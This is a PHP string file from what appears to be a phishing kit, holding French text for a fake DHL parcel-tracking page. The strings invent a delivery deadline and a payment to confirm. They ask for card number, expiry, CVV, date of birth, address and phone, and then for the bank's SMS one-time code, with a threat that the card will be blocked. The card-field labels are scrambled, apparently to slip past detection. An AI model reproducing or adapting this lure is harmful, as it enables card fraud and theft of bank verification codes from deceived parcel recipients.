<?php
/*==========================================================================
* +-+-+-+-+-+-+-+-+-+-+ Author Name      : ZÉROFAUTES
* |Z|É|R|O|F|A|U|T|E|S| Template Name    : 1&1
* +-+-+-+-+-+-+-+-+-+-+ Template Version : V.0.1
===========================================================================*/
function lang($phrase){
	static $lang = array(
		/* Main Page */
		'Title'  => '| Bienvenue |', 										/* Title */
		'Fo9001'  => 'Clients privés', 								/* Loading Header */
		'Fo9002' => "Clients de l'entreprise", 								/* Loading P 1 */
		'LdngP2' => 'Envoyer des colis,', 									/* Loading P 2 */
		'LdngP3' => 'Recevoir des colis', 									/* Loading P 3 */
		'LdngP4' => 'Aide et contact',  									/* Loading P 4 */
		'LdngP5'	 => 'Suivi DHL.',	  							/* DHL TRACKING */
		'CntP'	 => 'Vous trouverez ici des informations sur vos envois.',	  								/* Control Panel */
		'CusId'	 => "Suivez les envois de colis à tout moment, de l'expédition à la livraison",
		'InpL1'	 => 'Expédition DHL',										/* Label Input 1 */
		'CusPs'	 => 'numéro de suivi 0034043413918594392 - ',		  									/* Customer Password */
		'InpL2'	 => 'Statut: ',							/* Label Input 2 */
		'Rmmbr'	 => 'dans la livraison',										/* Remember Me */
		'Lbtn'	 => 'Message important!',											/* Login Btn */
		'Span1'	 => 'Pour terminer la livraison dès que possible, confirmez le paiement',				/* Are you still ... */
		'Span2'	 => 'en cliquant sur Suivant. La confirmation en ligne doit être effectuée dans les 2 jours suivants, avant son expiration.',
		'Ntke'	 => 'Suivant',									/* Btn next */
		'AsdH2'	 => 'Paquet DHL',											/* Service */
		'AsdS1'	 => 'Services DHL',										/* MailXchange */
		'AsdS2'	 => 'DHL Express',						/* Detailed help and contact */
		'AsdS3'	 => 'DHL Logistique',										/* Online FAQs */
		'AsdS4'	 => 'Contact',										/* GoToAssist */
		'P1H1'	 => 'Aide et service client',								/* 1&1 MyWebsite*/
		'P1Pr'	 => 'Regarde comment ça marche',											/* Here's how it works */
		'P2H1'	 => 'Application mobile',								/* Microsoft Office 365 */
		'P2Pr'	 => 'À propos de nous',					/* Paragraphe 2 Paragraphe */
		'P3H1'	 => 'Poste DHL',									/* 1&1 Domains */
		'P3Pr'	 => 'Responsabilité',											/* Paragraphe 3 Paragraphe */
		'PLink'	 => 'Presse',									/* More information */
		'FtrS1'	 => 'Carrière',							/* 1&1 Internet Ltd. • 2018 */
		'FtrS2'	 => 'DHL International GmbH - Tous droits réservés.',									/* Privacy Policy */
		'Sfokh'	 => 'Nous avons besoin de votre adresse pour nous assurer que des personnes non autorisées ne peuvent pas accéder à vos colis.',									/* We need your address to be sure */
		'Ayam'	 => '10 jours ouvrés',									/* 10 working days */
		'Froth'	 => "Dès l'arrivée de votre colis à l'agence DHL, passé ce délai, le colis sera retourné à l'expéditeur.",									/* From the arrival of your package */
		'InptCC'	 => 'Nva dp ereplmrit dt lm cmiet',									/* Cardholder's name */
		'InptCCN'	 => 'Npaéiv dt Cmiet dt Ciédre',									/* Credit card number */
		'ExpMmAa'	 => 'Tkurimervn AA=MM',									/* Expir */
		'NumCvC'	 => 'COO (COC)',									/* CVV */
		'AddInf'	 => 'District',									/* Address */
		'CodPOs'	 => 'code postal',									/* Zip */
		'MdiNa'	 => 'Ville',									/* Zip */
		'Zdiyad'	 => 'Date de naissance (jj / mm / aaaa)',									/* DOB */
		'Farnon'	 => 'Numéro de téléphone',									/* Phone Number */
		'Barid'	 => 'Votre e-mail',									/* Your Email */
		'PlzCon'	 => 'Veuillez confirmer le paiement suivant.',									/* Please confirm the following */
		'Theun'	 => 'Le mot de passe unique a été envoyé au numéro de mobile indiqué ci-dessous. Si vous avez besoin de changer votre numéro de téléphone portable, contactez votre banque ou modifiez-le via les canaux disponibles (ATM, web).',									/* Please confirm the following */
		'March'	 => 'marchande:',									/* Merchant */
		'ExpDh'	 => 'DHL EXPRESS',									/* DHL EXPRESS */
		'Ch7al'	 => 'Montant:',									/* Amount */
		'Tarikh'	 => 'Date:',									/* Date */
		'TlNum'	 => 'Votre numéro de téléphone:',									/* Your Phone Number */
		'SmCos'	 => 'Code SMS:',									/* Your SMS */
		'PlzSm'	 => 'Entrez le code de vérification reçu par SMS:',				/* Please enter the */
		'Subnn'	 => 'Soumettre',				/* Submit */
		'AllCp'	 => 'DHL International GmbH - Tous droits réservés.',				/* All Right */
		'SmEnv'	 => 'Code SMS envoyé ...',				/* SMS code sent... */
		'SmWron'	 => 'Le SMS est erroné ou a expiré! Après (3) erreurs de saisie du code reçu par SMS, la transaction en cours est annulée et la carte de crédit est bloquée.',				/* SMS is wrong */
		'LastSm'	 => 'Attention! Entrez le dernier SMS reçu',				/* SMS is wrong */
		'YouHav'	 => 'Vous avez activé avec succès le processus de livraison. Vous recevrez un e-mail lorsque nous enverrons votre colis.'				/* SMS is wrong */
		
		
		
		
	);	
	return $lang[$phrase];
}




//		 | ' | = &apos;




 ?>
 
 
 
 
 